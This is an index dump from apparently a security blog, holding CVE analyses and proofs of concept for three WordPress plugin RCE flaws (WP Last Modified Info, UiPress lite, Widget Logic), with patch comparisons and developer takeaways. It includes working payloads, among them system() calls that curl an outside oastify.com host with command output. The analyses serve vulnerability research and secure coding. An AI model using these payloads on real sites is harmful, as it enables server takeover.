POC","uri":"/posts/2025-12-03-cve-2025-30911/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Always validate both permissions and nonces for every AJAX endpoint. Never process direct user input for sensitive operations such as installing/activating plugins. Permission checks alone are not enough; CSRF protection is also required. ","date":"2025-12-03","objectID":"/posts/2025-12-03-cve-2025-30911/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/posts/2025-12-03-cve-2025-30911/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Remote Code Execution (RCE) WordPress RTMKit Plugin \u003c= 1.5.4 is vulnerable to PHP Object Injection ","date":"2025-12-03","objectID":"/posts/2025-12-03-cve-2025-30911/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-30911 Analysis \u0026 POC","uri":"/posts/2025-12-03-cve-2025-30911/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in the WordPress WP Last Modified Info Plugin.","date":"2025-12-02","objectID":"/posts/2025-12-02-cve-2025-52756/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/posts/2025-12-02-cve-2025-52756/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Improper Control of Generation of Code (‘Code Injection’) vulnerability in Sayan Datta’s WP Last Modified Info (wp-last-modified-info) plugin allows Remote Code Inclusion. This issue affects WP Last Modified Info from n/a through \u003c= 1.9.2. CVE ID: CVE-2025-52756 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 1.9.4 Patched Versions: 1.9.5 CVSS severity: Medium (7.2) Required Privilege: Contributor Product: WordPress WP Last Modified Info Plugin ","date":"2025-12-02","objectID":"/posts/2025-12-02-cve-2025-52756/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/posts/2025-12-02-cve-2025-52756/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – WP Last Modified Info 1.9.4 – vulnerable 1.9.5 – patched Diff Tool → Meld or any diff tool. ","date":"2025-12-02","objectID":"/posts/2025-12-02-cve-2025-52756/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/posts/2025-12-02-cve-2025-52756/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v1.9.4): Shortcode.php v1.9.4 public function render( $atts ) { $post = get_post(); if ( ! $post instanceof \\WP_Post ) { return ''; } if ( ! $this-\u003eis_enabled( 'enable_last_modified_cb' ) ) { return ''; } $author_id = $this-\u003eget_meta( $post-\u003eID, '_edit_last' ); if ( $this-\u003eis_equal( 'show_author_cb', 'custom', 'default' ) ) { $author_id = $this-\u003eget_data( 'lmt_show_author_list' ); } $default_format = get_option( 'date_format' ); $atts = shortcode_atts( [ 'id' =\u003e $post-\u003eID, 'template' =\u003e $this-\u003eget_data( 'lmt_last_modified_info_template' ), 'date_format' =\u003e $this-\u003eget_data( 'lmt_date_time_format', $default_format ), 'date_type' =\u003e $this-\u003eget_data( 'lmt_last_modified_format_post', 'default' ), 'schema' =\u003e $this-\u003eget_data( 'lmt_enable_jsonld_markup_cb', 'disable' ), 'author_id' =\u003e (int) $author_id, 'hide_archive' =\u003e '', 'filter_ids' =\u003e '', 'gap' =\u003e (int) $this-\u003eget_data( 'lmt_gap_on_post', 0 ), ], $atts, 'lmt-post-modified-info' ); $_post = get_post( absint( $atts['id'] ) ); if ( ! $_post ) { return ''; } if ( $atts['hide_archive'] !== '' ) { foreach ( array_map( 'trim', explode( ',', $atts['hide_archive'] ) ) as $callback ) { if ( is_callable( $callback ) \u0026\u0026 $callback() ) { return ''; } } } ... } The render() function of the shortcode accepts the $atts['hide_archive'] attribute from the user. This value is a string containing a list of function names, separated by commas (,). Example: $atts['hide_archive'] = \"a,b,c\"; Then: explode(',', $atts['hide_archive']) → ['a', 'b', 'c'] After splitting the string using explode(), the code uses: array_map('trim', ...) to remove extra whitespace at the beginning and end of each element, ensuring the function names are “clean” before processing. The result is still an array of strings, but normalized: [\" a \", \" b \", \" c \"] → [\"a\", \"b\", \"c\"] Next, the foreach loop iterates over each item and assigns it to the $callback variable. Here, $callback is a function name in string form. foreach ( ... as $callback ) For each $callback, the code checks: is_callable( $callback ) This means: 👉 Whether the function name exists and can be called. If it is callable, the code then directly invokes the function: $callback() No parameters are passed. If the called function returns true, the plugin will: return ''; and display nothing for the shortcode. Patch (v1.9.5): The patch introduces a whitelist of allowed functions to prevent arbitrary function execution. Shortcode.php v1.9.5 class Shortcode extends PostView { ... if ( in_array( $archive, $this-\u003efunctions, true ) \u0026\u0026 is_callable( $archive ) \u0026\u0026 $archive() ) { return $content; } ... } PostView.php v1.9.5 class PostView { protected $functions = [ 'is_archive', 'is_tax', 'is_home', 'is_front_page', 'is_search', 'is_404', 'is_author', 'is_category', 'is_tag', ]; ... } Since the Shortcode class extends PostView, it can use the $functions property from the parent class. ","date":"2025-12-02","objectID":"/posts/2025-12-02-cve-2025-52756/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/posts/2025-12-02-cve-2025-52756/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers a shortcode with the following line: add_shortcode( 'lmt-post-modified-info', [ $this, 'render' ] ); This means that when WordPress encounters the lmt-post-modified-info shortcode in a post’s content (or when the post is rendered containing this shortcode), WordPress will call the render() method of the current class to generate the output. To have the render() logic executed, the following condition must be satisfied: if ( ! $this-\u003eis_enabled( 'enable_last_modified_cb' ) ) { return ''; } This means the option must be enabled: Show Info on Frontend ","date":"2025-12-02","objectID":"/posts/2025-12-02-cve-2025-52756/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/posts/2025-12-02-cve-2025-52756/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Contributor adds shortcode [lmt-post-modified-info hide_archive='...'] in post\"] --\u003e B[\"WordPress loads the post content\"] B --\u003e C[\"Shortcode::render($atts) is executed\"] C --\u003e D[\"$atts['hide_archive'] is parsed and trimmed into list of callbacks\"] D --\u003e E[\"For each $callback in list\"] E --\u003e F{\"is_callable($callback)?\"} F --\u003e|Yes| G[\"Invoke $callback()\"] graph TD A[\"Contributor adds shortcode [lmt-post-modified-info hide_archive='...'] in post\"] --\u003e B[\"WordPress loads the post content\"] B --\u003e C[\"Shortcode::render($atts) is executed\"] C --\u003e D[\"$atts['hide_archive'] is parsed and trimmed into list of callbacks\"] D --\u003e E[\"For each $callback in list\"] E --\u003e F{\"is_callable($callback)?\"} F --\u003e|Yes| G[\"Invoke $callback()\"] graph TD A[\"Contributor adds shortcode [lmt-post-modified-info hide_archive='...'] in post\"] --\u003e B[\"WordPress loads the post content\"] B --\u003e C[\"Shortcode::render($atts) is executed\"] C --\u003e D[\"$atts['hide_archive'] is parsed and trimmed into list of callbacks\"] D --\u003e E[\"For each $callback in list\"] E --\u003e F{\"is_callable($callback)?\"} F --\u003e|Yes| G[\"Invoke $callback()\"] graph TD A[\"Contributor adds shortcode [lmt-post-modified-info hide_archive='...'] in post\"] --\u003e B[\"WordPress loads the post content\"] B --\u003e C[\"Shortcode::render($atts) is executed\"] C --\u003e D[\"$atts['hide_archive'] is parsed and trimmed into list of callbacks\"] D --\u003e E[\"For each $callback in list\"] E --\u003e F{\"is_callable($callback)?\"} F --\u003e|Yes| G[\"Invoke $callback()\"] ","date":"2025-12-02","objectID":"/posts/2025-12-02-cve-2025-52756/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/posts/2025-12-02-cve-2025-52756/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Use an Administrator account to enable the Show Info on Frontend option Log in as a Contributor Create a post containing the shortcode: [lmt-post-modified-info hide_archive=phpinfo] Submit and preview the post. Result ","date":"2025-12-02","objectID":"/posts/2025-12-02-cve-2025-52756/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/posts/2025-12-02-cve-2025-52756/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability in WP Last Modified Info \u003c= 1.9.4 allows a Contributor to inject a shortcode containing an arbitrary PHP function name in hide_archive. These functions are checked with is_callable() and then directly executed, leading to Remote Code Execution (RCE). Version 1.9.5 mitigates this by restricting calls to a predefined whitelist of safe functions. ","date":"2025-12-02","objectID":"/posts/2025-12-02-cve-2025-52756/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/posts/2025-12-02-cve-2025-52756/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Never call functions directly from user input, even when using is_callable(). If dynamic callbacks are required, always use a whitelist. Shortcodes are a potential attack surface and must be carefully validated and permission-controlled. ","date":"2025-12-02","objectID":"/posts/2025-12-02-cve-2025-52756/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/posts/2025-12-02-cve-2025-52756/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Remote Code Execution (RCE) WordPress WP Last Modified Info Plugin \u003c= 1.9.4 is vulnerable to PHP Object Injection ","date":"2025-12-02","objectID":"/posts/2025-12-02-cve-2025-52756/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-52756 Analysis \u0026 POC","uri":"/posts/2025-12-02-cve-2025-52756/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress UiPress lite Plugin.","date":"2025-12-01","objectID":"/posts/2025-12-01-cve-2025-3053/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/posts/2025-12-01-cve-2025-3053/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info UiPress lite | a plugin for easily creating custom dashboards, admin themes, and pages for WordPress contains a Remote Code Execution vulnerability in all versions up to and including 3.5.07 via the uip_process_form_input() function. This is because the function takes user-supplied input to execute arbitrary functions with arbitrary data and does not perform any capability checks. This allows authenticated attackers, with Subscriber-level access or higher, to execute arbitrary code on the server. CVE ID: CVE-2025-3053 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 3.5.07 Patched Versions: 3.5.08 CVSS severity: High (8.8) Required Privilege: Subscriber Product: WordPress UiPress lite Plugin ","date":"2025-12-01","objectID":"/posts/2025-12-01-cve-2025-3053/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/posts/2025-12-01-cve-2025-3053/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – UiPress lite: 3.5.07 – vulnerable 3.5.08 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-12-01","objectID":"/posts/2025-12-01-cve-2025-3053/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/posts/2025-12-01-cve-2025-3053/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v3.5.07): ajax-functions.php v3.5.07 public function uip_process_form_input() { // Check security nonce and 'DOING_AJAX' global Ajax::check_referer(); $data = json_decode(stripslashes($_POST[\"formData\"])); $data = Sanitize::clean_input_with_code($data); $userFunction = sanitize_text_field($_POST[\"userFunction\"]); if (!function_exists($userFunction)) { Ajax::error(__('Passed function doesn\\'t exist', \"uipress-lite\")); } // Try to start user supplied function try { $userFunction($data); } catch (Exception $e) { // Catch function error Ajax::error($e-\u003egetMessage()); } $returndata = []; $returndata[\"success\"] = true; wp_send_json($returndata); } The uip_process_form_input() function is triggered via AJAX and relies only on Ajax::check_referer() to verify the nonce and confirm the request is running in the DOING_AJAX context. This mechanism does not check the user’s capability with functions like current_user_can(), but only validates the request. As a result, any authenticated user (Subscriber and above) can specify any valid PHP function → leading to Remote Code Execution (RCE). Ajax.php v3.5.07 public static function check_referer() { $doingAjax = defined(\"DOING_AJAX\") \u0026\u0026 DOING_AJAX ? true : false; $referer = check_ajax_referer(\"uip-security-nonce\", \"security\") \u003e 0 ? true : false; $result = $doingAjax \u0026\u0026 $referer ? true : false; // Abort if not doing ajax or bad referer if (!$result) { $message = __(\"Unable to perform action\", \"uipress-lite\"); self::error($message); } } Data from $_POST[\"formData\"] is processed with stripslashes() and then passed into json_decode(), so $data is usually a stdClass (or the corresponding data type based on the JSON content). This value is then passed through Sanitize::clean_input_with_code(), which may filter data, but does not control function execution. Tip If $_POST[\"formData\"] is sent as a plain string instead of JSON (\"{}\"), json_decode() will return a string instead of a stdClass. This allows full control over $data. Next, the function name is taken from $_POST[\"userFunction\"] and only checked using function_exists(). This means any valid PHP function existing in the WordPress/PHP environment can be called, as long as the attacker knows or guesses its name. Finally, the line $userFunction($data); performs a dynamic function call with user-controlled data. Allowing users to directly control the function name without a whitelist or permission checks creates a Remote Code Execution (RCE) vulnerability, or at minimum an Arbitrary Function Call, enabling authenticated attackers (e.g., Subscribers) to invoke dangerous functions such as system(), exec(), shell_exec(), eval(), etc., resulting in command execution or system manipulation. Patch (v3.5.08): ajax-functions.php v3.5.08 public function uip_process_form_input() { // Check security nonce and 'DOING_AJAX' global Ajax::check_referer(); Ajax::error(__(\"Passing form data to user specified functions has been disabled to prevent potential security issues.\", \"uipress-lite\")); } The patch effectively fixes the issue by removing the original logic entirely :)). Changes introduced in the patch ","date":"2025-12-01","objectID":"/posts/2025-12-01-cve-2025-3053/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/posts/2025-12-01-cve-2025-3053/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis ajax-functions.php v3.5.07 public function load_ajax() { $function_names = [ \"uip_get_users_and_roles\", \"uip_get_post_types\", \"uip_get_recent_posts\", \"uip_get_posts_for_table\", \"uip_get_post_table_columns\", \"uip_delete_post\", \"uip_save_user_preference\", \"uip_get_user_preference\", \"uip_search_content\", \"uip_process_form_input\", \"uip_send_form_email\", \"uip_save_form_as_option\", \"uip_save_form_as_user_option\", \"uip_pre_populate_form_data\", \"uip_create_frame_switch\", \"uip_get_sync_options\", \"uip_refresh_sync_key\", \"uip_save_sync_options\", \"uip_start_site_sync\", \"uip_check_for_template_updates\", \"uip_process_block_query\", \"uip_save_site_option\", \"uip_send_message_to_gpt\", \"uip_global_export\", \"uip_global_import\", \"uip_push_new_custom_menu_items\", \"uip_remove_custom_menu_items\", ]; // Push ajax actions foreach ($function_names as $name) { add_action(\"wp_ajax_{$name}\", [$this, $name]); } } The plugin registers multiple AJAX actions via the load_ajax() function. Each name in the $function_names array is hooked using add_action(\"wp_ajax_{$name}\", [$this, $name]). This means that when a request is sent to /wp-admin/admin-ajax.php with action = $name, WordPress will directly invoke the method with the same name in the plugin’s class. Since uip_process_form_input is in the list, a request such as: POST /wp-admin/admin-ajax.php action=uip_process_form_input\u0026security=...\u0026formData=...\u0026userFunction=... will trigger uip_process_form_input(). ","date":"2025-12-01","objectID":"/posts/2025-12-01-cve-2025-3053/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/posts/2025-12-01-cve-2025-3053/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"POST /wp-admin/admin-ajax.php...action=uip_process_form_input\"] --\u003e B[\"WordPress calls uip_process_form_input()\"] B --\u003e C[\"Ajax::check_referer()\"] C --\u003e D[\"$data = json_decode(formData)\"] D --\u003e E[\"$userFunction = sanitize_text_field(userFunction)\"] E --\u003e F{\"function_exists($userFunction)?\"} F --\u003e|Yes| G[\"$userFunction($data)\"] F --\u003e|No| H[\"Ajax::error()\"] G --\u003e I[\"wp_send_json(success)\"] graph TD A[\"POST /wp-admin/admin-ajax.php...action=uip_process_form_input\"] --\u003e B[\"WordPress calls uip_process_form_input()\"] B --\u003e C[\"Ajax::check_referer()\"] C --\u003e D[\"$data = json_decode(formData)\"] D --\u003e E[\"$userFunction = sanitize_text_field(userFunction)\"] E --\u003e F{\"function_exists($userFunction)?\"} F --\u003e|Yes| G[\"$userFunction($data)\"] F --\u003e|No| H[\"Ajax::error()\"] G --\u003e I[\"wp_send_json(success)\"] graph TD A[\"POST /wp-admin/admin-ajax.php...action=uip_process_form_input\"] --\u003e B[\"WordPress calls uip_process_form_input()\"] B --\u003e C[\"Ajax::check_referer()\"] C --\u003e D[\"$data = json_decode(formData)\"] D --\u003e E[\"$userFunction = sanitize_text_field(userFunction)\"] E --\u003e F{\"function_exists($userFunction)?\"} F --\u003e|Yes| G[\"$userFunction($data)\"] F --\u003e|No| H[\"Ajax::error()\"] G --\u003e I[\"wp_send_json(success)\"] graph TD A[\"POST /wp-admin/admin-ajax.php...action=uip_process_form_input\"] --\u003e B[\"WordPress calls uip_process_form_input()\"] B --\u003e C[\"Ajax::check_referer()\"] C --\u003e D[\"$data = json_decode(formData)\"] D --\u003e E[\"$userFunction = sanitize_text_field(userFunction)\"] E --\u003e F{\"function_exists($userFunction)?\"} F --\u003e|Yes| G[\"$userFunction($data)\"] F --\u003e|No| H[\"Ajax::error()\"] G --\u003e I[\"wp_send_json(success)\"] ","date":"2025-12-01","objectID":"/posts/2025-12-01-cve-2025-3053/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/posts/2025-12-01-cve-2025-3053/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Log in as a Subscriber user Obtain the security value from the response Security value Send a request containing the payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... action=uip_process_form_input\u0026security=65c1a4e801\u0026formData=\"curl+http://1aclwhon6rw1l1bj569pxpkjqaw1ks8h.oastify.com?leadked=$(whoami)\"\u0026userFunction=system Result ","date":"2025-12-01","objectID":"/posts/2025-12-01-cve-2025-3053/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/posts/2025-12-01-cve-2025-3053/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-3053 vulnerability stems from uip_process_form_input() allowing users to directly control the function name to be executed via userFunction, while only checking function_exists() and not performing any capability checks or using a whitelist. This allows low-privileged authenticated users (Subscriber) to perform Arbitrary Function Calls, leading to Remote Code Execution (RCE). Version 3.5.08 mitigates the issue by completely disabling this mechanism. ","date":"2025-12-01","objectID":"/posts/2025-12-01-cve-2025-3053/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/posts/2025-12-01-cve-2025-3053/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Do not allow users to control dynamic function calls without a strict whitelist. nonce / check_ajax_referer() do not replace current_user_can(). function_exists() is not a security control. Logic flaws are more dangerous than improper sanitization. Always apply the principle of least privilege to AJAX endpoints. ","date":"2025-12-01","objectID":"/posts/2025-12-01-cve-2025-3053/:8:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/posts/2025-12-01-cve-2025-3053/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Remote Code Execution (RCE) WordPress UiPress lite Plugin \u003c= 3.5.07 is vulnerable to PHP Object Injection ","date":"2025-12-01","objectID":"/posts/2025-12-01-cve-2025-3053/:9:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-3053 Analysis \u0026 POC","uri":"/posts/2025-12-01-cve-2025-3053/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in the WordPress Widget Logic Plugin.","date":"2025-11-30","objectID":"/posts/2025-11-30-cve-2025-32222/","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/posts/2025-11-30-cve-2025-32222/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Improper Control of Generation of Code (‘Code Injection’) vulnerability in Widgetlogic.org’s Widget Logic (widget-logic) allows Code Injection. This issue affects Widget Logic from versions n/a to \u003c= 6.0.5. CVE ID: CVE-2025-32222 Vulnerability Type: Remote Code Execution Affected Versions: \u003c= 6.0.5 Patched Versions: 6.0.6 CVSS severity: High (9.9) Required Privilege: Contributor Product: WordPress Widget Logic Plugin ","date":"2025-11-30","objectID":"/posts/2025-11-30-cve-2025-32222/:1:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/posts/2025-11-30-cve-2025-32222/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – Widget Logic: 6.0.5 – vulnerable 6.0.6 – patched Diff Tool (diff) → Meld or any other diff tool. ","date":"2025-11-30","objectID":"/posts/2025-11-30-cve-2025-32222/:2:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/posts/2025-11-30-cve-2025-32222/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause In the vulnerable version (v6.0.5): logic.php v6.0.5 function widget_logic_check_logic($logic) { $logic = @trim((string) $logic); $logic = apply_filters(\"widget_logic_eval_override\", $logic); if (is_bool($logic)) { return $logic; } if ($logic === '') { return true; } if (stristr($logic, 'return') === false) { $logic = 'return (' . html_entity_decode($logic, ENT_COMPAT | ENT_HTML401 | ENT_QUOTES) . ');'; } set_error_handler('widget_logic_error_handler'); // phpcs:ignore -- we have mode for debugging for admins try { $show_widget = eval ($logic); // @codingStandardsIgnoreLine - widget can't work without eval } catch (Error $e) { trigger_error($e-\u003egetMessage(), E_USER_WARNING); // @codingStandardsIgnoreLine - message is not dependent on user input $show_widget = false; } restore_error_handler(); return $show_widget; } The widget_logic_check_logic() function uses eval() to directly execute the logic string provided by the user, without restricting which functions can be called. If the logic string does not contain the return keyword, the function automatically wraps it into a return(...) statement to ensure the expression is always valid when executed by eval(). This mechanism allows users to enter simple conditional expressions, but it also turns every user input into complete PHP code, significantly increasing the risk of arbitrary code execution (RCE). Patch (v6.0.6): class-wpsight-api.php v6.0.6 function widget_logic_check_logic($logic) { $allowed_functions = array( 'is_home', 'is_front_page', 'is_single', 'is_page', 'is_category', 'is_tag', 'is_archive', 'is_search', 'is_404', 'is_user_logged_in', 'current_user_can', 'is_active_sidebar', 'is_admin', ); $allowed_functions = apply_filters('widget_logic_allowed_functions', $allowed_functions); $logic = trim((string) $logic); if ('' === $logic) { return true; } // Set up error handling set_error_handler('widget_logic_error_handler', E_WARNING | E_USER_WARNING); // @codingStandardsIgnoreLine - we need this for error handling try { // Tokenize the logic string $tokens = widget_logic_tokenize($logic); // Parse and evaluate the expression $pos = 0; $result = widget_logic_parse_expression($tokens, $pos, $allowed_functions); // Check if there are any unexpected tokens after the expression if ($pos \u003c count($tokens)) { throw new Exception(esc_html__('Widget Logic: Unexpected tokens after expression.', 'widget-logic')); } return (bool)$result; } catch (Exception $e) { widget_logic_error_handler(E_USER_WARNING, $e-\u003egetMessage()); return false; } finally { restore_error_handler(); } } Changes introduced in the patch The patch removes eval() and replaces it with a tokenizer and parser to evaluate the logic, allowing only functions in a whitelist. It validates the syntax, detects unexpected tokens, and handles errors with try/catch/finally, thereby strengthening security while still ensuring normal widget logic behavior. ","date":"2025-11-30","objectID":"/posts/2025-11-30-cve-2025-32222/:3:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/posts/2025-11-30-cve-2025-32222/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers a filter hook: index.php v6.0.5 add_filter('render_block', 'widget_logic_block_render', 10, 2); render_block is a WordPress filter hook that is called whenever a block (Gutenberg block) is rendered. This means that when a post/page is created, the plugin intercepts the block rendering process with the widget_logic_block_render callback. index.php v6.0.5 function widget_logic_block_render($block_content, $block) { if (!isset($block['attrs']['widgetLogic'])) { return $block_content; } return widget_logic_check_logic($block['attrs']['widgetLogic']) ? $block_content : ''; } The widget_logic_block_render function checks if the block has the widgetLogic attribute. If not, it is rendered normally. This attribute is added through the Advanced Option when adding a block. Widget Logic in Advanced Options widget_logic_check_logic is called if the block contains this attribute. The vulnerability is disclosed with a required privilege of Contributor, since this role can create posts and use Widget Logic in Advanced Options. ","date":"2025-11-30","objectID":"/posts/2025-11-30-cve-2025-32222/:4:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/posts/2025-11-30-cve-2025-32222/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Contributor creates/edits a Gutenberg block\"] --\u003e B[\"Add widgetLogic value in Advanced Options\"] B --\u003e C[\"Page/Post is rendered\"] C --\u003e D[\"render_block filter is triggered\"] D --\u003e E[\"widget_logic_block_render() is called\"] E --\u003e F{\"block['attrs']['widgetLogic'] exists?\"} F -- No --\u003e G[\"Render block normally\"] F -- Yes --\u003e H[\"Pass widgetLogic to widget_logic_check_logic()\"] H --\u003e I[\"Normalize \u0026 wrap logic with return(...) if needed\"] I --\u003e J[\"Execute logic using eval()\"] J --\u003e K{\"Result = true ?\"} K -- Yes --\u003e L[\"Block content is displayed\"] K -- No --\u003e M[\"Block is hidden (empty)\"] J --\u003e N{\"Malicious code injected?\"} N -- Yes --\u003e O[\"Arbitrary PHP code executed (RCE)\"] L --\u003e Z[\"End\"] M --\u003e Z O --\u003e Z graph TD A[\"Contributor creates/edits a Gutenberg block\"] --\u003e B[\"Add widgetLogic value in Advanced Options\"] B --\u003e C[\"Page/Post is rendered\"] C --\u003e D[\"render_block filter is triggered\"] D --\u003e E[\"widget_logic_block_render() is called\"] E --\u003e F{\"block['attrs']['widgetLogic'] exists?\"} F -- No --\u003e G[\"Render block normally\"] F -- Yes --\u003e H[\"Pass widgetLogic to widget_logic_check_logic()\"] H --\u003e I[\"Normalize \u0026 wrap logic with return(...) if needed\"] I --\u003e J[\"Execute logic using eval()\"] J --\u003e K{\"Result = true ?\"} K -- Yes --\u003e L[\"Block content is displayed\"] K -- No --\u003e M[\"Block is hidden (empty)\"] J --\u003e N{\"Malicious code injected?\"} N -- Yes --\u003e O[\"Arbitrary PHP code executed (RCE)\"] L --\u003e Z[\"End\"] M --\u003e Z O --\u003e Z graph TD A[\"Contributor creates/edits a Gutenberg block\"] --\u003e B[\"Add widgetLogic value in Advanced Options\"] B --\u003e C[\"Page/Post is rendered\"] C --\u003e D[\"render_block filter is triggered\"] D --\u003e E[\"widget_logic_block_render() is called\"] E --\u003e F{\"block['attrs']['widgetLogic'] exists?\"} F -- No --\u003e G[\"Render block normally\"] F -- Yes --\u003e H[\"Pass widgetLogic to widget_logic_check_logic()\"] H --\u003e I[\"Normalize \u0026 wrap logic with return(...) if needed\"] I --\u003e J[\"Execute logic using eval()\"] J --\u003e K{\"Result = true ?\"} K -- Yes --\u003e L[\"Block content is displayed\"] K -- No --\u003e M[\"Block is hidden (empty)\"] J --\u003e N{\"Malicious code injected?\"} N -- Yes --\u003e O[\"Arbitrary PHP code executed (RCE)\"] L --\u003e Z[\"End\"] M --\u003e Z O --\u003e Z graph TD A[\"Contributor creates/edits a Gutenberg block\"] --\u003e B[\"Add widgetLogic value in Advanced Options\"] B --\u003e C[\"Page/Post is rendered\"] C --\u003e D[\"render_block filter is triggered\"] D --\u003e E[\"widget_logic_block_render() is called\"] E --\u003e F{\"block['attrs']['widgetLogic'] exists?\"} F -- No --\u003e G[\"Render block normally\"] F -- Yes --\u003e H[\"Pass widgetLogic to widget_logic_check_logic()\"] H --\u003e I[\"Normalize \u0026 wrap logic with return(...) if needed\"] I --\u003e J[\"Execute logic using eval()\"] J --\u003e K{\"Result = true ?\"} K -- Yes --\u003e L[\"Block content is displayed\"] K -- No --\u003e M[\"Block is hidden (empty)\"] J --\u003e N{\"Malicious code injected?\"} N -- Yes --\u003e O[\"Arbitrary PHP code executed (RCE)\"] L --\u003e Z[\"End\"] M --\u003e Z O --\u003e Z ","date":"2025-11-30","objectID":"/posts/2025-11-30-cve-2025-32222/:5:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/posts/2025-11-30-cve-2025-32222/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Log in as a Contributor user Create a post, add any block, and add the payload in Widget Logic: system('curl http://929topgvyzo9d93rxe1xpxcriio9cz0o.oastify.com/?leadked=$(whoami)') Result ","date":"2025-11-30","objectID":"/posts/2025-11-30-cve-2025-32222/:6:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 POC","uri":"/posts/2025-11-30-cve-2025-32222/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion CVE‑2025‑32222 stems from the use of eval() on user-controlled data in widget_logic_check_logic(). With only Contributor privileges, an attacker can inject malicious logic into the widgetLogic attribute of a block, causing arbitrary PHP code to be executed during the render_block process. The automatic wrapping with return(...) makes exploitation even easier, as any input ultimately becomes valid PHP code. Version 6.0.6 fully addresses this by removing eval() and introducing a tokenize + parse + allowlist mechanism, effectively blocking arbitrary code execution. ","date":"2025-11-30","objectID":"/posts/2025-11-30-cve-2025-32222/:7:0","tags":["analyst","plugin","remote code execution"],"title":"CVE-2025-32222 Analysis \u0026 